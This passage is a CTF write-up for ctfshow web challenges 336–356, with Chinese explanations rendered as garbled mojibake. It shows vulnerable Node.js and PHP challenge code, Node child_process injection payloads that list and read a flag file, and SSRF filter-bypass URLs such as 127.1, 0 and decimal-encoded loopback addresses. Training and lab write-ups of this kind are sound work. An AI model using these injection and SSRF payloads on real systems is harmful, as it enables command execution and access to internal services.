<p>å½“ä½ åœ¨ Web ç•Œé¢é€šè¿‡æŸç§å‘½ä»¤æ³¨å…¥æ‰‹æ®µè°ƒç”¨ Node.jsçš„ child_process æ—¶ï¼Œå¦‚æœå¸Œæœ›ç›´æ¥åœ¨é¡µé¢ä¸Šçœ‹åˆ°å‘½ä»¤è¾“å‡ºç»“æœï¼Œexecsync ä¼šæ›´ç›´è§‚ã€‚å®ƒä¼šé˜»å¡ç›´åˆ°å‘½ä»¤æ‰§è¡Œç»“æŸï¼Œå¹¶å°†ç»“æœè¿”å›ç»™ä½ çš„ä»£ç ï¼Œä½ èƒ½ç›´æ¥ä»¥å­—ç¬¦ä¸²å½¢å¼å¤„ç†å’Œå±•ç¤ºã€‚è€Œ execåˆ™éœ€è¦é€šè¿‡å›è°ƒæ¥æ‹¿ç»“æœï¼Œå¦‚æœæ²¡å†™å›è°ƒæˆ–æ²¡æ­£ç¡®å¤„ç†ï¼Œå°±åªä¼šçœ‹åˆ°ä¸€ä¸ª[object object]çš„è¿”å›ã€‚</p></blockquote>
<h4 id="web336">web336<a hidden class="anchor" aria-hidden="true" href="#web336">#</a></h4>
<p>è¿™é¢˜è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä½†æ˜¯è²Œä¼¼æŠŠexecSyncåŠäº†</p>
<p>ç”¨å…¶ä»–æ–¹æ³•å³å¯</p>
<pre tabindex="0"><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()

global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;,[&#39;.&#39;]).toString()
</code></pre><h4 id="web337">web337<a hidden class="anchor" aria-hidden="true" href="#web337">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kd">var</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kd">function</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="k">return</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">/* GET home page. */</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;xxxxxxx&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="o">===</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="o">!==</span><span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">flag</span><span class="p">)</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nx">b</span><span class="o">+</span><span class="nx">flag</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,{</span> <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;tql&#39;</span><span class="p">});</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</span></span></code></pre></div><h3 id="ssrf">SSRF<a hidden class="anchor" aria-hidden="true" href="#ssrf">#</a></h3>
<h4 id="web351">web351<a hidden class="anchor" aria-hidden="true" href="#web351">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥è¯»æ–‡ä»¶</p>
<p>Payload:</p>
<pre tabindex="0"><code>url=127.0.0.1/flag.php
url=localhost/flag.php
</code></pre><h4 id="web352">web352<a hidden class="anchor" aria-hidden="true" href="#web352">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|127.0.0/&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é“é¢˜é™åˆ¶äº†åªèƒ½ä½¿ç”¨httpå’Œhttpsåè®®</p>
<p>åŒæ—¶ä¹Ÿæ·»åŠ äº†è¿‡æ»¤</p>
<pre tabindex="0"><code>if(!preg_match(&#39;/localhost|127.0.0/&#39;))
</code></pre><p>ç¼ºçœæ³•</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>url=http://127.1/flag.php

url=http://0/flag.php
//windowsä¸­è§£æä¸º0.0.0.0
//linuxè§£æä¸º127.0.0.1
</code></pre><p>or</p>
<p>ä½¿ç”¨åè¿›åˆ¶ç»•è¿‡</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>url=http://2130706433/flag.php
</code></pre><h4 id="web353">web353<a hidden class="anchor" aria-hidden="true" href="#web353">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|127\.0\.|\ã€‚/i&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿‡æ»¤</p>
<pre tabindex="0"><code>!preg_match(&#39;/localhost|127\.0\.|\ã€‚/i&#39;, $url)
</code></pre><p>è¿™é¢˜ä¾æ—§å¯ä»¥ç”¨ä¸Šé¢˜æ–¹æ³•è§£å†³</p>
<p>å…¶ä»–payloadï¼š</p>
<pre tabindex="0"><code>// 127.0.0.1 ~ 127.255.255.254 éƒ½è¡¨ç¤º localhost

url=http://127.255.255.254/flag.php
</code></pre><p>127å¼€å¤´éƒ½ä¼šè¢«è§£æä¸ºlocalhost</p>
<h4 id="web354">web354<a hidden class="anchor" aria-hidden="true" href="#web354">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/localhost|1|0|ã€‚/i&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é“é¢˜çš„1å’Œ0éƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨dnsé‡å®šå‘çš„æ–¹æ³•æ¥ç»•è¿‡</p>
<p>ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªåŸŸåsudo.ccä¼šé‡å®šå‘åˆ°127.0.0.1</p>
<p>payload:</p>
<pre tabindex="0"><code>url=http://sudo.cc/flag.php
</code></pre><p>å…¶ä»–æ–¹æ³•</p>
<p>å¯ä»¥ç”¨è‡ªå·±çš„åŸŸåè¿›è¡Œdnsé‡å®šå‘</p>
<p>æˆ–è€…é€šè¿‡ <a href="http://ceye.io/">http://ceye.io/</a></p>
<h4 id="web355">web355<a hidden class="anchor" aria-hidden="true" href="#web355">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$host</span><span class="o">=</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">5</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é“é¢˜å¯¹hostçš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ‘ä»¬å¯ä»¥ç”¨0æ¥ä»£æ›¿127.0.0.1</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>url=http://0/flag.php
</code></pre><p>or</p>
<pre tabindex="0"><code>url=http://127.1/flag.php
</code></pre><h4 id="web356">web356<a hidden class="anchor" aria-hidden="true" href="#web356">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$host</span><span class="o">=</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
